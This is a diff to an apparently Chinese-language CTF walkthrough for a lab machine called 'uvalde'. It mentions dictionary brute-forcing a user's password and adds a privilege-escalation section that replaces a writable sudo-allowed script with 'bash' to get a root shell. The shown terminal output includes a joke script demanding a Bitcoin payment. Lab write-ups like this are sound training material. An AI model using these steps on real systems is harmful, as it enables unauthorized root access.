@@ -212,7 +212,93 @@ Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
 
 <img width="759" height="234" alt="图片" src="https://github.com/user-attachments/assets/a93a281b-b97f-4c12-a831-b06dc03cf7df" />
 
-尝试用字典爆破这个用户名：matthew2023@1554
+尝试用字典爆破这个用户名得到其密码：matthew2023@1554
 
 <img width="924" height="151" alt="图片" src="https://github.com/user-attachments/assets/ff961412-93d9-4812-9c48-a2a86b4f697e" />
 
+# 权限提升
+
+```
+matthew@uvalde:~$ sudo -l
+Matching Defaults entries for matthew on uvalde:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User matthew may run the following commands on uvalde:
+    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
+matthew@uvalde:~$ cat /opt/superhack
+#! /bin/bash 
+clear -x
+
+GRAS=$(tput bold)
+JAUNE=$(tput setaf 3)$GRAS
+BLANC=$(tput setaf 7)$GRAS
+BLEU=$(tput setaf 4)$GRAS
+VERT=$(tput setaf 2)$GRAS
+ROUGE=$(tput setaf 1)$GRAS
+RESET=$(tput sgr0)
+
+cat << EOL
+
+
+ _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
+|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
+|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
+| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
+|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
+ _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
+|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|
+
+
+
+EOL
+
+
+printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
+printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
+printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"
+
+printf "\n"
+
+[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit
+
+while [ -z "$domain" ]; do
+read -p "${VERT}domain to hack:${RESET} " domain
+done
+
+printf "\n"
+
+n=50
+
+string=""
+for ((i=0; i<$n; i++))
+do
+string+="."
+done
+
+for ((i=0; i<$n; i++))
+do
+string="${string/./#}"
+printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
+sleep .09
+done
+
+printf "\n"
+printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
+printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"
+
+echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
+matthew@uvalde:~$ cd /opt
+matthew@uvalde:/opt$ mv superhack backup
+matthew@uvalde:/opt$ echo 'bash' > superhack
+matthew@uvalde:/opt$ sudo -l
+Matching Defaults entries for matthew on uvalde:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User matthew may run the following commands on uvalde:
+    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
+matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
+root@uvalde:/opt# id
+uid=0(root) gid=0(root) groups=0(root)
+```
